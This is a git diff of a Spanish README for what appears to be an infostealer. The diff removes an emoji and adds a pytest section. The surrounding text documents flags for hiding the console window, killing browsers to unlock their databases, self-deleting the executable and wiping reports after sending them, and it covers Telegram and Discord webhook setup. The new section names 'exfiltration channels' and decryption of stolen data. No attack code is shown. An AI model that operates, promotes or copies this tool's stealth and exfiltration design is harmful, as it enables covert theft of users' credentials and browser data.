@@ -98,7 +98,7 @@ python main.py --stealth --output-dir "C:\temp\logs"
 | | `--delay` | Retraso inicial (segundos) antes de actuar. |
 | | `--stealth` | Oculta la ventana de consola inmediatamente al arrancar. |
 | | `--auto-kill` | Cierra navegadores automáticamente si la base de datos está bloqueada. |
-| | `--self-destruct` | 💥 **Elimina el ejecutable** tras finalizar el ciclo. |
+| | `--self-destruct` | **Elimina el ejecutable** tras finalizar el ciclo. |
 | | `--no-wipe` | No borra los reportes locales tras enviarlos. |
 | | `--clean` | Limpia todos los reportes antiguos en la carpeta de salida. |
 | | `--debug` | Muestra logs detallados de depuración. |
@@ -161,6 +161,25 @@ Requiere **Token** y **Chat ID**.
 Requiere **Webhook URL**.
 
 * Configúralo en: Ajustes del Canal -> Integraciones -> Webhooks.
+
+---
+
+## 🧪 Calidad y Testing
+
+La suite incluye una batería de pruebas automatizadas para garantizar la integridad de los algoritmos de descifrado y los canales de exfiltración.
+
+Para ejecutar los tests, asegúrate de tener activado el entorno virtual y corre:
+
+```bash
+# Ejecutar todos los tests
+pytest
+
+# Ejecutar con reporte detallado
+pytest -v
+```
+
+> [!TIP]
+> Los tests utilizan `pytest-mock` para simular llamadas de red y acceso a archivos del sistema, lo que permite validaciones seguras sin riesgo de exfiltración real durante las pruebas.
 
 ---
 
